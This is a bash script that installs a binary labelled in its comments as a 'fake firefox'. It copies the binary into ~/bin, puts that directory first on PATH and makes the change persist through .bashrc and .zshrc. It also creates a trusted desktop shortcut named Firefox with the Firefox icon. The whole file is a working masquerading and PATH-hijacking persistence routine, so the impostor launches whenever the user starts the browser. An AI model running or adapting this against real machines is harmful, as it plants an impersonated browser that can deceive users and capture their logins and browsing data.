#!/bin/bash

# Name of the fake firefox
FIREFOX_NAME="firefox"

# Note: firefox exe is a relative path
FIREFOX_EXE="./$FIREFOX_NAME"
# Fake bin directory to add as system path
TARGET_DIR="$HOME/bin"
# Fake firefox's location
TARGET_FIREFOX="$TARGET_DIR/$FIREFOX_NAME"
# Directory to user's desktop 
DESKTOP_DIR="$HOME/Desktop"
# Directory to fake firefox's desktop shortcut
DESKTOP_FILE="$DESKTOP_DIR/$FIREFOX_NAME.desktop"

# Create the fake bin directory
mkdir -p "$TARGET_DIR"
# Copy firefox exe into fake bin directory
cp "$FIREFOX_EXE" "$TARGET_FIREFOX"
# Make firefox exe executable
chmod +x "$TARGET_FIREFOX"
# Add it to system path
export PATH="$TARGET_DIR:$PATH"
# Get the previous command
PATH_LINE='export PATH=$HOME/bin:$PATH'

# Add path line to bashrc or zshrc as well
if [ -f "$HOME/.bashrc" ]; then
   if ! grep -Fxq "$PATH_LINE" "$HOME/.bashrc"; then
       echo "$PATH_LINE" >> "$HOME/.bashrc"
   fi
fi

if [ -f "$HOME/.zshrc" ]; then
    if ! grep -Fxq "$PATH_LINE" "$HOME/.zshrc"; then
        echo "$PATH_LINE" >> "$HOME/.zshrc"
    fi
fi

# If there is a desktop environment, add a desktop shortcut
if [ -d "$DESKTOP_DIR" ]; then 
    cat > "$DESKTOP_FILE" <<EOF
[Desktop Entry]
Name=Firefox
Exec=$TARGET_FIREFOX
Icon=firefox
Terminal=false
Type=Application
Categories=Network;WebBrowser;
EOF

    chmod +x "$DESKTOP_FILE"
    # GNOME-specific: mark as trusted to allow launching
    if command -v gio &>/dev/null; then
        gio set "$DESKTOP_FILE" "metadata::trusted" yes 2>/dev/null || true
    fi
fi
